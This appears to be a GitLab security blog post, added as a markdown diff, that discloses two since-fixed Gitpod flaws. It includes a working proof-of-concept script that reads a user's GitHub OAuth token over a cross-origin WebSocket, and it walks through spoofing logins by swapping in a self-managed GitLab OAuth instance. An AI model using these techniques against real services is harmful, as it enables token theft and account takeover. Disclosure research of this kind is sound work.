@@ -1,0 +1,173 @@
+---
+title: "A brief look at Gitpod, two bugs, and a quick fix"
+author: "Joern Schneeweisz"
+author_gitlab: joernchen
+author_twitter: joernchen
+categories: security
+image_title: '/images/blogimages/closeup-photo-of-black-and-blue-keyboard-1194713.jpg'
+description: "Our security researcher takes a look at Gitpod and finds some access tokens under the carpet."
+tags: security, security research
+twitter_text: "Read how a @GitLab security researcher took a look at @Gitpod and found some access tokens under the carpet."
+featured: yes
+postType: TBD
+related_posts:
+  - "blog/2020/03/30/how-to-exploit-parser-differentials/"
+  - "/blog/2020/10/23/switching-sides-in-security/"
+  - "/blog/2019/11/29/shopping-for-an-admin-account/"
+---
+
+While looking at GitLab's [Gitpod integration](https://docs.gitlab.com/ee/integration/gitpod.html), I came across two rather critical flaws in Gitpod itself. In this post, I'll cover the process of identifying the vulnerabilities and some background on Gitpod. The more critical issue was fixed and the fix was pushed to production by the Gitpod team in less than five hours from my initial report. Huge kudos to the Gitpod team for that quick turnaround.
+
+## What is Gitpod? 
+
+First, let's see what Gitpod actually is -- taken straight from [gitpod.io](https://gitpod.io):
+
+> Spin up fresh, automated dev environments for each task, in the cloud, in seconds.
+
+That quote sums it up really well. You can login to Gitpod with your GitLab, GitHub, or Bitbucket account and then use a pretty full-blown, web-based development environment to work on your code, run tests, or even spin up services and expose them from your Gitpod instance to the internet.
+
+## Gitpod vulnerability #1: cross-origin WebSocket access
+### Authentication process
+
+When logging into Gitpod via GitLab, we need to grant Gitpod the GitLab OAuth scopes `read_user` and `api`. The `api` scope is needed to give Gitpod access to GitLab private repositories and push Git commits on behalf of the user.
+
+![Gitpod OAuth scopes](/images/blogimages/gitpod-oauth-scopes.png){: .shadow.medium.center}
+Gitpod authorization scope.
+{: .note.text-center}
+
+
+The fact that Gitpod holds an OAuth token with full API access to all three major Git hosting platforms sparked my interest, as this level of access makes it quite a high-value target. So I decided to look a bit at the inner workings and see how far I could get.
+
+### Using the product
+
+When opening a Git-based project you are assigned a random workspace name [in the form of](https://github.com/gitpod-io/gitpod/blob/2b2702f31b6fc6f67c4b447c814dd6db6b4a433f/components/gitpod-protocol/src/util/generate-workspace-id.ts) `color-animal-XXXXXXXX` like `amaranth-wallaby-e7mg0z34.ws-eu03.gitpod.io`. Once the workspace is booted, you can perform all sorts of tasks, with one very interesting task being to expose application ports to the public. Exposed ports are made available at `portnumber-color-animal-XXXXXXXX`, so exposing port 3000 for our example workspace will result in having the port accessible at `https://3000-amaranth-wallaby-e7mg0z34.ws-eu03.gitpod.io`.
+
+While using the web-based IDE under `https://amaranth-wallaby-e7mg0z34.ws-eu03.gitpod.io`, I noticed the application opened a WebSocket connection to an API endpoint at `https://gitpod.io/api/gitpod`. Within this WebSocket connection the IDE component of Gitpod from our workspace's subdomain was communicating with the main API. A sample request message when authenticated via GitHub would be:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 12,
+  "method": "getToken",
+  "params": {
+    "host": "github.com"
+  }
+}
+
+```
+
+This request would obtain the logged-in user's access token for GitHub:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 12,
+  "result": {
+    "value": "gho_justafaketokenhere",
+    "username": "oauth2",
+    "scopes": [
+      "user:email"
+    ],
+    "updateDate": "2021-04-14T09:06:46.578Z"
+  }
+}
+```
+
+### Cross-origin WebSockets
+
+After seeing the above messages being exchanged on the WebSocket across the different origins, the next thing I did was try this from a site where I control the content. Namely the exposed port! While it's not the exact workspace name it's still under the same subdomain: `.ws-eu03.gitpod.io`.
+
+I simply served the following snippet via the exposed application port at `https://3000-amaranth-wallaby-e7mg0z34.ws-eu03.gitpod.io`
+
+```html
+<script type="module">
+  import { Octokit } from "https://cdn.skypack.dev/@octokit/rest";
+  var exampleSocket = new WebSocket("wss://gitpod.io/api/gitpod")
+  exampleSocket.onmessage = function (event) {
+    console.log(event.data);
+    var x = JSON.parse(event.data);
+    var token = x.result.value;
+    console.log(x.result.value);
+    const octokit = new Octokit({
+    auth: token,
+  });
+ octokit.users.getAuthenticated().then((user) => alert("hello "+user.data.login));
+}
+exampleSocket.onopen = function (event) {
+exampleSocket.send('{"jsonrpc":"2.0","id":29,"method":"getToken","params":{"host":"github.com"}}')
+}
+</script>
+```
+
+And to my surprise this actually worked. It was possible to access the main WebSocket on behalf of the authenticated Gitpod user from a website I fully control.
+
+The above script accesses the WebSocket while sending the user's cookies along with the request. This means we can authenticate the connection and ask for the user's GitHub access token. To verify everything works, the script authenticates against the GitHub API using the extracted access token to obtain the associated username and greets them with a `hello <github-username>` browser alert dialog.
+
+This issue was fixed by Gitpod in their [May 2021 release](https://github.com/gitpod-io/gitpod/pull/4334/files#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4edR24).
+
+For a realistic attack, we'd need to lure a logged in Gitpod user to the app's exposed port to be able to fully impersonate them on GitLab/GitHub/BitBucket. While this is certainly quite a serious issue it still involves a lot of user interaction and social engineering to be successful.
+
+## Gitpod vulnerability #2: log in as any account
+### Custom integrations
+
+While familiarizing myself a bit with the product, I came across the [`Integrations`](https://gitpod.io/integrations) settings.
+
+![Gitpod Integrations](/images/blogimages/gitpod_integrations.png){: .shadow.medium.center}
+Gitpod integrations settings.
+{: .note.text-center}
+
+Custom integrations allow a user to gather an OAuth access token from self-managed GitLab and GitHub installations. This makes perfect sense since you might want to use Gitpod with your self-managed instance too. This setting caused a big 'what if?' moment for me. What if I could use a self-managed instance to log into Gitpod? On a self-managed instance I'm the king of my castle and can set arbitrary email addresses for any user. The idea here is to fool the login process and login as someone else. So I created an OAuth application as [documented](https://www.gitpod.io/docs/gitlab-integration#registering-a-self-hosted-gitlab-installation) and registered it as an Integration within Gitpod.
+
+### My first attempt
+
+If you choose to login with `GitLab.com`, the regular login flow starts with a call to:
+
+```
+https://gitpod.io/api/login?host=gitlab.com&returnTo=https%3A%2F%2Fgitpod.io%2Flogin-success
+```
+
+The first attempt I made was to swap `gitlab.com` with the URL of a self-managed instance, just like this:
+
+```
+https://gitpod.io/api/login?host=gl.thetanuki.io&returnTo=https%3A%2F%2Fgitpod.io%2Flogin-success
+```
+
+It wasn't that easy, this try would promptly redirect to:
+
+```
+https://gitpod.io/sorry#Login%20with%20gl.thetanuki.io%20is%20not%20allowed.
+```
+
+Letting me know that I cannot log in with my self-managed instance.
+
+### My second attempt
+
+The login request to `https://gitpod.io/api/login?host=gitlab.com&returnTo=https%3A%2F%2Fgitpod.io%2Flogin-success` originally redirected to:
+
+```
+https://gitlab.com/oauth/authorize?response_type=code&redirect_uri=https%3A%2F%2Fgitpod.io%2Fauth%2Fgitlab%2Fcallback&scope=read_user%20api&client_id=bde00c0a8f15b7041aafabcc98210c73c5f2ca973cbd52c8a555fa08deebbcc8
+```
+
+I rewrote that request to point to my self-managed instance, adapted the `redirect_uri` and `client_id` values to match those on that instance. After going through the login flow I could log into any account simply by setting the corresponding email address on the self-managed instance.
+
+The result you can see in the screenshot below. Gitpod picked up the `admin@example.com` email address for my self-managed account, but really it could have been any email address I'd wanted to spoof:
+
+![admin@example.com account](/images/blogimages/admin-example.png){: .shadow.medium.center}
+Admin example in Gitpod settings.
+{: .note.text-center}
+
+Gitpod was super quick to fix this issue, from the initial report it took them just about five hours to ship [a fix](https://github.com/gitpod-io/gitpod/pull/3940)!
+
+### Conclusion
+
+First of all huge thanks to the Gitpod team for a 10 out of 10 disclosure experience and prompt handling of the vulnerability reports.
+
+Giving full API access to third parties is a common SaaS/cloud practice, however a leak somewhere could impact seemingly unrelated services.  In this case the attack wouldn't only have affected Gitpod alone but also the connected GitLab/GitHub/Bitbucket accounts.
+
+***Security Research at GitLab***
+
+*Security research is one component of our broader security organization's efforts to enhance the security posture of our company, products, and client-facing services. See our [Security Handbook](/handbook/security/security-engineering/security-research/) to learn more.*
+
+Photo by [Marta Branco](https://www.pexels.com/@martabranco?utm_content=attributionCopyText&utm_medium=referral&utm_source=pexels) on [Pexels](https://www.pexels.com/photo/closeup-photo-of-black-and-blue-keyboard-1194713/?utm_content=attributionCopyText&utm_medium=referral&utm_source=pexels)
+{: .note}
+
